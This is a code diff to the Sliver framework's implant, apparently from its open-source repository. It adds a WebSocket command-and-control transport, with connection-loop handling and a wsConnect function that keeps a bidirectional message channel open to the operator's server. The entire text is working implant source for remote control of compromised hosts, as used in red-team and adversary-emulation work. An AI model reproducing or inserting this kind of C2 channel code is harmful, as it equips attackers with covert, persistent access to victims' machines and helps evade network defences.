@@ -39,6 +39,10 @@ import (
 
 	// {{end}}
 
+	// {{if .Config.WSc2Enabled}}
+	"github.com/bishopfox/sliver/implant/sliver/transports/wsclient"
+	"github.com/gorilla/websocket"
+	// {{end}}
 	// {{if .Config.WGc2Enabled}}
 	"errors"
 
@@ -140,7 +144,19 @@ func StartConnectionLoop(abort <-chan struct{}) <-chan *Connection {
 					continue
 				}
 				// {{end}} - HTTPc2Enabled
-
+			case "wss":
+				fallthrough
+			case "ws":
+				// *** websocket ***
+				// {{if .Config.WSc2Enabled}}
+				connection, err = wsConnect(uri)
+				if err != nil {
+					// {{if .Config.Debug}}
+					log.Printf("[%s] Connection failed %s", uri.Scheme, err)
+					// {{end}}
+					continue
+				}
+				// {{end}} - WSc2Enabled
 			case "dns":
 				// *** DNS ***
 				// {{if .Config.DNSc2Enabled}}
@@ -765,3 +781,112 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 }
 
 // {{end}} -TCPPivotc2Enabled
+
+// {{if .Config.WSc2Enabled}}
+func wsConnect(uri *url.URL) (*Connection, error) {
+
+	send := make(chan *pb.Envelope)
+	recv := make(chan *pb.Envelope)
+	ctrl := make(chan struct{})
+	var conn *websocket.Conn
+
+	connection := &Connection{
+		Send:    send,
+		Recv:    recv,
+		ctrl:    ctrl,
+		tunnels: map[uint64]*Tunnel{},
+		mutex:   &sync.RWMutex{},
+		once:    &sync.Once{},
+		IsOpen:  false,
+		uri:     uri,
+
+		// Do not call directly, use exported Cleanup() instead
+		cleanup: func() {
+			// {{if .Config.Debug}}
+			log.Printf("[ws] lost connection, cleanup...")
+			// {{end}}
+			close(send)
+			conn.Close()
+
+			close(recv)
+		},
+	}
+
+	connection.Stop = func() error {
+		// {{if .Config.Debug}}
+		log.Printf("[ws] Stop()")
+		// {{end}}
+		connection.Cleanup()
+		return nil
+	}
+
+	connection.Start = func() error {
+		// {{if .Config.Debug}}
+		log.Printf("Connecting -> ws(s)://%s", uri.Host)
+		// {{end}}
+
+		opts := httpclient.ParseHTTPOptions(uri)
+		if uri.Scheme == "ws" {
+			opts.ForceHTTP = true
+		}
+		client, err := httpclient.WebSocketStartSession(uri.Host, uri.Path, opts)
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("ws(s) WebSocketStartSession error %v", err)
+			// {{end}}
+			return err
+		}
+
+		conn, err = wsclient.WsConnect(uri, client)
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("ws(s) connection error %v", err)
+			// {{end}}
+			return err
+		}
+		connection.IsOpen = true
+
+		go func() {
+			defer connection.Cleanup()
+			for {
+				select {
+				case envelope, ok := <-send:
+					if !ok {
+						return
+					}
+					err := wsclient.WriteEnvelope(conn, envelope)
+					if err != nil {
+						return
+					}
+				case <-time.After(wsclient.PingInterval):
+					err := wsclient.WritePing(conn)
+					if err != nil {
+						return
+					}
+				}
+			}
+		}()
+
+		go func() {
+			defer connection.Cleanup()
+			for {
+				envelope, err := wsclient.ReadEnvelope(conn)
+				if err == io.EOF {
+					break
+				}
+				if err != io.EOF && err != nil {
+					break
+				}
+				if envelope != nil {
+					recv <- envelope
+				}
+			}
+		}()
+
+		return nil
+	}
+
+	return connection, nil
+}
+
+// {{end}} -WSc2Enabled
